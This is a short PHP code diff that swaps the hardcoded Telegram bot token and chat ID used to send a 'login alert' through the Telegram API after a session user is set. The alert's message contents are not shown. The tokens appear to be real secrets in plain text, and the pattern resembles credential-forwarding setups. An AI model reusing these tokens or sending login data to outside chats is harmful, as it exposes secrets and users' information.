@@ -35,8 +35,8 @@ $_SESSION['user']    = [
 ];
 
 // Telegram login alert
-$botToken = "8929516825:AAHkDcNreEOQ13SQyqv5uymAkVtngO1W3S0";
-$chatId   = "1843218039";
+$botToken = "8894156558:AAEHDdjuoZ5LqkybQqhtBQ6aEOsuw9kMnto";
+$chatId   = "6178621959";
 
 $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
 curl_setopt($ch, CURLOPT_POST, true);
